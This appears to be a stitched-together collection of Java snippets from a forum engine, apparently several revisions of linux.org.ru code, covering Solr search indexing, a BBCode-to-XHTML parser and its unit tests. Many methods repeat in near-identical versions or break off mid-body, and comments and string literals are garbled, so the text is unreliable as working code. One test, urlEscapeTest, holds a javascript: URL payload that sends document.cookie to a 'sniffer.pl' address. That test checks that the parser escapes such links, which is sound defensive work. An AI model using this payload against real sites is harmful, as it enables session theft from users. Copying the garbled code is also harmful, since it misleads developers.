private static SearchViewer . SearchInterval parseInterval ( String date ) { if ( date = = null ) { return SearchViewer . DEFAULT_INTERVAL ; } if ( " 3month " . equalsIgnoreCase ( date ) ) { return SearchViewer . SearchInterval . THREE_MONTH ; support for old url's } return SearchViewer.SearchInterval.valueOf(date.toUpperCase()); } 
public static void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchViewer . SearchOrder . class , new PropertyEditorSupport ( ) { @Override 
public void setAsText ( String s ) throws IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchViewer.SearchOrder.RELEVANCE); 
private void updateMessage ( Message topic ) throws IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; doc . addField ( " title " , topic . getTitle ( ) ) ; doc . addField ( " topic_title " , topic . getTitle ( ) ) ; doc . addField ( " message " , topic . getMessage ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message topic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , comment . getTopic ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; doc . addField ( " topic_title " , topic . getTitle ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " title " , topic . getTitle ( ) ) ; } else { doc . addField ( " title " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; return doc ; } 
private static SolrInputDocument processComment ( Message topic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , comment . getTopic ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; String topicTitle = topic . getTitle ( ) ; doc . addField ( " topic_title " , topicTitle ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " title " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; return doc ; } 
public static void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchViewer . SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) throws IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchViewer.SearchOrder.RELEVANCE); } else if ("2".equals(s)) { setValue(SearchViewer.SearchOrder.DATE); } else { setValue(SearchViewer.SearchOrder.valueOf(s)); } } }); binder.registerCustomEditor(SearchViewer.SearchInterval.class, new PropertyEditorSupport() { @Override 
public void setAsText ( String s ) throws IllegalArgumentException { setValue ( SearchViewer . SearchInterval . valueOf ( s . toUpperCase ( ) ) ) ; } 
public static void initBinder ( PropertyEditorRegistry binder ) { binder . registerCustomEditor ( SearchViewer . SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) throws IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchViewer.SearchOrder.RELEVANCE); } else if ("2".equals(s)) { setValue(SearchViewer.SearchOrder.DATE); } else { setValue(SearchViewer.SearchOrder.valueOf(s)); } } }); binder.registerCustomEditor(SearchViewer.SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchViewer.SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchViewer.SearchRange.class, new PropertyEditorSupport() { @Override 
public void setAsText ( String s ) throws IllegalArgumentException { setValue ( SearchViewer . SearchRange . valueOf ( s . toUpperCase ( ) ) ) ; } 
public void setAsText ( String s ) throws IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static String escape ( String html ) { return html . replace ( " & " , " &amp; " ) 
private Node pushTextNode ( Node currentNode , String text , boolean escaped ) { if ( ! currentNode . allows ( " text " ) ) { if ( text . trim ( ) . length ( ) = = 0 ) { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , text ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , text ) ) ; } } else { if ( currentNode . allows ( " div " ) ) { currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " div " , " " ) ) ; currentNode = descend ( currentNode ) ; } else { currentNode = ascend ( currentNode ) ; } currentNode = pushTextNode ( currentNode , text , false ) ; } } else { Matcher matcher = P_REGEXP . matcher ( text ) ; if ( matcher . find ( ) ) { currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " p " , " " ) ) ; currentNode = descend ( currentNode ) ; currentNode = pushTextNode ( currentNode , text . substring ( 0 , matcher . start ( ) ) , false ) ; currentNode = ascend ( currentNode ) ; currentNode = pushTextNode ( currentNode , text . substring ( matcher . end ( ) ) , false ) ; } else { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , text ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , text ) ) ; } } } return currentNode ; } 
private Node descend ( Node currentNode ) { return currentNode . getChildren ( ) . get ( currentNode . getChildren ( ) . size ( ) - 1 ) ; } 
private Node ascend ( Node currentNode ) { return currentNode . getParent ( ) ; } 
protected String prepare ( String bbcode ) { return bbcode . replaceAll ( " r " , " " ) . replaceAll ( " " , " " ) ; } 
public RootNode parse ( String rawbbcode ) { return parse ( rawbbcode , true , " " ) ; 
public String renderXHtml ( RootNode rootNode ) { return rootNode . renderXHtml ( ) ; } 
public String renderBBCode ( RootNode rootNode ) { return rootNode . renderBBCode ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean rootAllowsInline ) { return parser . parse ( bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean rootAllowsInline , boolean renderCut , String cutUrl ) { return parser . parse ( bbcode , renderCut , cutUrl ) . renderXHtml ( ) ; } 
public static String correct ( String bbcode , boolean rootAllowsInline ) { return parser . parse ( bbcode ) . renderBBCode ( ) ; } 
public static String to_html ( String text ) { return bb2xhtml ( text , false ) ; } 
public String renderBBCode ( ) { StringBuilder ret = new StringBuilder ( ) ; ret . append ( '[' ) . append ( text ) . append ( ']' ) ; return ret . toString ( ) ; } 
public boolean allows ( String tagname ) { assert false ; return false ; } 
public boolean prohibited ( String tagname ) { return false ; } 
public int lengthChildren ( ) { return children . size ( ) ; } 
public boolean isParameter ( ) { return ( parameter ! = null ) & & ( parameter . length ( ) > 0 ) ; } 
public String renderXHtml ( ) { assert false ; return " " ; } 
public String renderBBCode ( ) { assert false ; return " " ; } 
public String renderChildrenXHtml ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( ) ) ; } return stringBuilder . toString ( ) ; } 
public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . toString ( ) ; 
public String renderXHtml ( ) { return renderChildrenXHtml ( ) ; } 
public boolean allows ( String tagname ) { if ( allowInline ) { return Parser . FLOW_TAGS . contains ( tagname ) ; 
public String renderBBCode ( ) { return renderChildrenBBCode ( ) ; } 
public String renderXHtml ( ) { return bbtag . renderNodeXhtml ( this ) ; } 
public String renderBBCode ( ) { return bbtag . renderNodeBBCode ( this ) ; } 
public String renderXHtml ( ) { return Parser . escape ( text ) ; } 
public String renderBBCode ( ) { return text ; } 
public boolean allows ( String tagname ) { return false ; } 
public String renderNodeXhtml ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { String lang = node . getParameter ( ) . trim ( ) ; ret . append ( " <pre class= \" language- " ) . append ( Parser . escape ( lang ) ) . append ( " \" ><code> " ) ; } else { ret . append ( " <pre><code> " ) ; } ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </code></pre> " ) ; return ret . toString ( ) ; } 
public String renderNodeXhtml ( Node node ) { if ( renderCut ) { return super . renderNodeXhtml ( node ) ; 
public String renderNodeXhtml ( Node node ) { StringBuilder opening = new StringBuilder ( htmlEquiv ) ; StringBuilder ret = new StringBuilder ( ) ; if ( attributes ! = null ) { Iterator i = attributes . keySet ( ) . iterator ( ) ; opening . append ( ' ' ) ; while ( i . hasNext ( ) ) { Map . Entry < String , String > entry = ( Map . Entry < String , String > ) i . next ( ) ; String key = entry . getKey ( ) ; String value = entry . getValue ( ) ; opening . append ( key ) ; opening . append ( '=' ) ; opening . append ( Parser . escape ( value ) ) ; opening . append ( ' ' ) ; } } if ( selfClosing ) { ret . append ( '<' ) . append ( opening ) . append ( " /> " ) ; } else { if ( node . lengthChildren ( ) > 0 ) { ret . append ( '<' ) . append ( opening ) . append ( '>' ) ; ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </ " ) . append ( htmlEquiv ) . append ( '>' ) ; } } return ret . toString ( ) ; } 
public String renderNodeBBCode ( Node node ) { if ( " div " . equals ( name ) ) { return node . renderChildrenBBCode ( ) ; 
public String renderNodeBBCode ( Node node ) { TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; return txtNode . getText ( ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; return ret . append ( '[' ) 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) ; return Parser . getMemberLink ( memberName ) ; 
public String renderNodeBBCode ( Node node ) { return " " ; } 
public String renderNodeXhtml ( Node node ) { throw new NotImplementedException ( ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder opening = new StringBuilder ( name ) ; StringBuilder render = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { opening . append ( '=' ) ; opening . append ( node . getParameter ( ) ) ; } if ( selfClosing ) { render . append ( '[' ) . append ( opening ) . append ( " /] " ) ; } else { render . append ( '[' ) . append ( opening ) . append ( ']' ) . append ( node . renderChildrenBBCode ( ) ) . append ( " [/ " ) . append ( name ) . append ( ']' ) ; } return render . toString ( ) ; } 
public boolean isSelfClosing ( ) { return selfClosing ; } 
public boolean isDiscardable ( ) { return discardable ; } 
public String renderNodeXhtml ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; String url ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; if ( node . isParameter ( ) ) { url = node . getParameter ( ) . trim ( ) ; } else { url = txtNode . getText ( ) . trim ( ) ; } String linkText = txtNode . getText ( ) . trim ( ) ; if ( url . length ( ) ! = 0 ) { ret . append ( " <a href= \" " ) ; ret . append ( Parser . escape ( url ) ) ; ret . append ( " \" > " ) ; ret . append ( Parser . escape ( linkText ) ) ; ret . append ( " </a> " ) ; } return ret . toString ( ) ; } 
private Node pushTextNode ( Node currentNode , String text , boolean escaped ) { tlog . debug ( " push text: " + text ) ; if ( ! currentNode . allows ( " text " ) ) { if ( text . trim ( ) . length ( ) = = 0 ) { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , text ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , text ) ) ; } } else { if ( currentNode . allows ( " p " ) ) { currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " p " , " " ) ) ; currentNode = descend ( currentNode ) ; } else { currentNode = ascend ( currentNode ) ; } currentNode = pushTextNode ( currentNode , text , false ) ; } } else { Matcher matcher = P_REGEXP . matcher ( text ) ; if ( matcher . find ( ) ) { tcurrentNode = pushTextNode ( currentNode , text . substring ( 0 , matcher . start ( ) ) , false ) ; tcurrentNode = ascend ( currentNode ) ; currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " p " , " " ) ) ; currentNode = descend ( currentNode ) ; currentNode = pushTextNode ( currentNode , text . substring ( matcher . end ( ) ) , false ) ; } else { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , text ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , text ) ) ; } } } return currentNode ; } 
protected String prepare ( String bbcode ) { return bbcode . replaceAll ( " r " , " " ) . replaceAll ( " " , " [softbr] " ) ; } 
private static String buildParams ( Map < String , String > params ) { StringBuilder str = new StringBuilder ( ) ; for ( Map . Entry < String , String > entry : params . entrySet ( ) ) { if ( str . length ( ) > 0 ) { str . append ( '&' ) ; } try { str . append ( URLEncoder . encode ( entry . getKey ( ) , " UTF-8 " ) ) ; str . append ( '=' ) ; str . append ( URLEncoder . encode ( entry . getValue ( ) , " UTF-8 " ) ) ; } catch ( UnsupportedEncodingException e ) { throw new RuntimeException ( e ) ; } } return str . toString ( ) ; } 
public String renderNodeXhtml ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; String param = null ; if ( node . isParameter ( ) ) { param = node . getParameter ( ) . trim ( ) . replaceAll ( " \" " , " " ) ; } if ( Parser . ALLOWED_LIST_TYPE . contains ( param ) ) { ret . append ( " <ol type= \" " ) ; ret . append ( param ) ; ret . append ( " \" > " ) ; ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </ol> " ) ; } else { ret . append ( " <ul> " ) ; ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </ul> " ) ; } return ret . toString ( ) ; } 
public static String bb2xhtml ( String bbcode ) { return parser . parse ( bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , String cutUrl ) { return parser . parse ( bbcode , renderCut , cutUrl ) . renderXHtml ( ) ; } 
public static String correct ( String bbcode ) { return parser . parse ( bbcode ) . renderBBCode ( ) ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) . toLowerCase ( ) ; return Parser . getMemberLink ( memberName ) ; 
private Node pushTextNode ( Node currentNode , String text , boolean escaped ) { tlog . debug ( " push text: " + text ) ; if ( ! currentNode . allows ( " text " ) ) { if ( text . trim ( ) . length ( ) = = 0 ) { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , text ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , text ) ) ; } } else { if ( currentNode . allows ( " div " ) ) { currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " div " , " " ) ) ; currentNode = descend ( currentNode ) ; } else { currentNode = ascend ( currentNode ) ; } currentNode = pushTextNode ( currentNode , text , false ) ; } } else { Matcher matcher = P_REGEXP . matcher ( text ) ; if ( matcher . find ( ) ) { tcurrentNode = pushTextNode ( currentNode , text . substring ( 0 , matcher . start ( ) ) , false ) ; tcurrentNode = ascend ( currentNode ) ; currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " p " , " " ) ) ; currentNode = descend ( currentNode ) ; currentNode = pushTextNode ( currentNode , text . substring ( matcher . end ( ) ) , false ) ; } else { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , text ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , text ) ) ; } } } return currentNode ; } 
public String renderNodeXhtml ( Node node ) { StringBuilder opening = new StringBuilder ( htmlEquiv ) ; StringBuilder ret = new StringBuilder ( ) ; if ( attributes ! = null ) { Iterator i = attributes . keySet ( ) . iterator ( ) ; opening . append ( ' ' ) ; while ( i . hasNext ( ) ) { Map . Entry < String , String > entry = ( Map . Entry < String , String > ) i . next ( ) ; String key = entry . getKey ( ) ; String value = entry . getValue ( ) ; opening . append ( key ) ; opening . append ( '=' ) ; opening . append ( Parser . escape ( value ) ) ; opening . append ( ' ' ) ; } } if ( htmlEquiv . isEmpty ( ) ) { ret . append ( node . renderChildrenXHtml ( ) ) ; } else { if ( selfClosing ) { ret . append ( '<' ) . append ( opening ) . append ( " /> " ) ; } else { if ( node . lengthChildren ( ) > 0 ) { ret . append ( '<' ) . append ( opening ) . append ( '>' ) ; ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </ " ) . append ( htmlEquiv ) . append ( '>' ) ; } } } return ret . toString ( ) ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; return Parser . getMemberLink ( memberName ) ; 
public String renderXHtml ( RootNode rootNode , Connection db ) { return rootNode . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , Connection db ) { return parser . parse ( bbcode ) . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , String cutUrl , Connection db ) { return parser . parse ( bbcode , renderCut , cutUrl ) . renderXHtml ( db ) ; } 
public String renderXHtml ( Connection db ) { assert false ; return " " ; } 
public String renderChildrenXHtml ( Connection db ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( db ) ) ; } return stringBuilder . toString ( ) ; } 
public String renderXHtml ( Connection db ) { return renderChildrenXHtml ( db ) ; } 
public String renderXHtml ( Connection db ) { return bbtag . renderNodeXhtml ( this , db ) ; } 
public String renderXHtml ( Connection db ) { return Parser . escape ( text ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( renderCut ) { return super . renderNodeXhtml ( node , db ) ; 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder opening = new StringBuilder ( htmlEquiv ) ; StringBuilder ret = new StringBuilder ( ) ; if ( attributes ! = null ) { Iterator i = attributes . keySet ( ) . iterator ( ) ; opening . append ( ' ' ) ; while ( i . hasNext ( ) ) { Map . Entry < String , String > entry = ( Map . Entry < String , String > ) i . next ( ) ; String key = entry . getKey ( ) ; String value = entry . getValue ( ) ; opening . append ( key ) ; opening . append ( '=' ) ; opening . append ( Parser . escape ( value ) ) ; opening . append ( ' ' ) ; } } if ( htmlEquiv . isEmpty ( ) ) { ret . append ( node . renderChildrenXHtml ( db ) ) ; } else { if ( selfClosing ) { ret . append ( '<' ) . append ( opening ) . append ( " /> " ) ; } else { if ( node . lengthChildren ( ) > 0 ) { ret . append ( '<' ) . append ( opening ) . append ( '>' ) ; ret . append ( node . renderChildrenXHtml ( db ) ) ; ret . append ( " </ " ) . append ( htmlEquiv ) . append ( '>' ) ; } } } return ret . toString ( ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; String param = null ; if ( node . isParameter ( ) ) { param = node . getParameter ( ) . trim ( ) . replaceAll ( " \" " , " " ) ; } if ( Parser . ALLOWED_LIST_TYPE . contains ( param ) ) { ret . append ( " <ol type= \" " ) ; ret . append ( param ) ; ret . append ( " \" > " ) ; ret . append ( node . renderChildrenXHtml ( db ) ) ; ret . append ( " </ol> " ) ; } else { ret . append ( " <ul> " ) ; ret . append ( node . renderChildrenXHtml ( db ) ) ; ret . append ( " </ul> " ) ; } return ret . toString ( ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; String pattern ; try { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( Exception ex ) { pattern = " <s>%s</s> " ; } return String . format ( pattern , Parser . escape ( memberName ) , Parser . escape ( memberName ) ) ; 
public String renderNodeXhtml ( Node node , Connection db ) { return renderNodeXhtml ( node ) ; } 
public boolean allows ( String tagname ) { return parser . getBLOCK_LEVEL_TAGS ( ) . contains ( tagname ) ; } 
public void testURLHighlight7 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT10 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( RESULT10 , formatter . process ( ) ) ; } 
public static String bb2xhtml ( String bbcode , Connection db ) { return parserWithImages . parse ( bbcode ) . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , String cutUrl , Connection db ) { return parserWithImages . parse ( bbcode , renderCut , cutUrl ) . renderXHtml ( db ) ; } 
public boolean allows ( String tagname ) { return parser . getBlockLevelTags ( ) . contains ( tagname ) ; } 
public String renderNodeXhtml ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; String url ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; if ( node . isParameter ( ) ) { url = node . getParameter ( ) . trim ( ) ; } else { url = txtNode . getText ( ) . trim ( ) ; } String linkText = txtNode . getText ( ) . trim ( ) ; if ( linkText = = null | | linkText . isEmpty ( ) ) { linkText = url ; } if ( url . length ( ) ! = 0 ) { ret . append ( " <a href= \" " ) ; ret . append ( Parser . escape ( url ) ) ; ret . append ( " \" > " ) ; ret . append ( Parser . escape ( linkText ) ) ; ret . append ( " </a> " ) ; } return ret . toString ( ) ; } 
public void pTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " test ntest1 ntest2 " , null ) , " test ntest1<p>test2</p> " ) ; } 
public void tagEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " <br> " , null ) , " &lt;br&gt; " ) ; } 
public void urlEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , null ) , 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " , null ) , " <ul></ul>0<ul><li>1</li><li>2</li></ul> " ) ; } 
public void codeEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code] \" code&code \" [/code] " , null ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " ) ; } 
public void brTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [br] " , null ) , " <br/> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [b]hello world[/b] " , null ) , " <b>hello world</b> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [i]hello world[/i] " , null ) , " <i>hello world</i> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [s]hello world[/s] " , null ) , " <s>hello world</s> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [strong]hello world[/strong] " , null ) , " <strong>hello world</strong> " ) ; } 
public void urlTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url]http:linux.org.ru[/url] " , null ) , " <a href= \" http:linux.org.ru \" >http:linux.org.ru</a> " ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru]linux[/url] " , null ) , " <a href= \" http:linux.org.ru \" >linux</a> " ) ; } 
public void listTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list][*]one[*]two[*]three[/list] " , null ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; } 
public void codeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code][list][*]one[*]two[*]three[/list][/code] " , null ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " ) ; } 
public void Stub ( ) { Assert . assertEquals ( " 123 " , " 123 " ) ; } 
public String getProcessedMessage ( Connection db , boolean includeCut ) throws SQLException { if ( lorcode ) { StringBuilder builder = new StringBuilder ( ) ; 
private static String getProcessedMessage ( Connection db , PreparedStatement pst , Comment comment ) throws SQLException { pst . setInt ( 1 , comment . getId ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; rs . next ( ) ; String text = rs . getString ( 1 ) ; boolean bbcode = rs . getBoolean ( 2 ) ; rs . close ( ) ; if ( bbcode ) { StringBuilder builder = new StringBuilder ( ) ; 
private static String getProcessedMessage ( Connection db , String message ) throws SQLException { StringBuilder builder = new StringBuilder ( ) ; BBCodeProcessor proc = new BBCodeProcessor ( ) ; builder . append ( " <div style= \" display:inline-block;width:99% \" ><div style= \" float:left;width:49%;display:inline-block \" > " ) ; builder . append ( proc . preparePostText ( db , message ) ) ; builder . append ( " </div><div> " ) ; builder . append ( ParserUtil . bb2xhtml ( message , true , " " , db ) ) ; builder . append ( " </div></div> " ) ; return builder . toString ( ) ; 
private static String getProcessedMessage ( Connection db , String message ) throws SQLException { StringBuilder builder = new StringBuilder ( ) ; BBCodeProcessor proc = new BBCodeProcessor ( ) ; builder . append ( " <div style= \" display:inline-block;width:99% \" ><div style= \" float:left;width:49%;display:inline-block \" > " ) ; builder . append ( proc . preparePostText ( db , message ) ) ; builder . append ( " </div><div style= \" float:left;width:49%;display:inline-block \" > " ) ; builder . append ( ParserUtil . bb2xhtml ( message , true , " " , db ) ) ; builder . append ( " </div></div> " ) ; return builder . toString ( ) ; 
public void uriTest ( ) { try { Assert . assertEquals ( URIUtil . encodeQuery ( " http:search.barnesandnoble.com/booksearch/first book.pdf " ) , " http:search.barnesandnoble.com/booksearch/first%20book.pdf " ) ; 
public static String escape ( String html ) { return HTMLFormatter . htmlSpecialChars ( html ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String imgurl = txtNode . getText ( ) ; try { String fixUrl = UriUtils . encodeQuery ( URLUtil . fixURL ( imgurl ) , " UTF-8 " ) ; ret . append ( " <img src= \" " ) ; ret . append ( UriUtils . encodeQuery ( fixUrl , " UTF-8 " ) ) ; ret . append ( " \" /> " ) ; } catch ( Exception ex ) { ret . append ( " <s> " ) ; ret . append ( Parser . escape ( imgurl ) ) ; ret . append ( " </s> " ) ; } return ret . toString ( ) ; } 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " , null ) , " 0<ul><li>1</li><li>2</li></ul> " ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( renderCut ) { StringBuilder ret = new StringBuilder ( ) ; 
private static Node descend ( Node currentNode ) { return currentNode . getChildren ( ) . get ( currentNode . getChildren ( ) . size ( ) - 1 ) ; } 
private static Node ascend ( Node currentNode ) { return currentNode . getParent ( ) ; } 
public void pTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " test ntest1 ntest2 " , null ) , " <p>test ntest1</p><p>test2</p> " ) ; } 
public void tagEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " <br> " , null ) , " <p>&lt;br&gt;</p> " ) ; } 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " , null ) , " <p>0</p><ul><li>1</li><li>2</li></ul> " ) ; } 
public void brTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [br] " , null ) , " <p><br/></p> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [b]hello world[/b] " , null ) , " <p><b>hello world</b></p> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [i]hello world[/i] " , null ) , " <p><i>hello world</i></p> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [s]hello world[/s] " , null ) , " <p><s>hello world</s></p> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [strong]hello world[/strong] " , null ) , " <p><strong>hello world</strong></p> " ) ; } 
public void urlTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url]http:linux.org.ru[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " ) ; } 
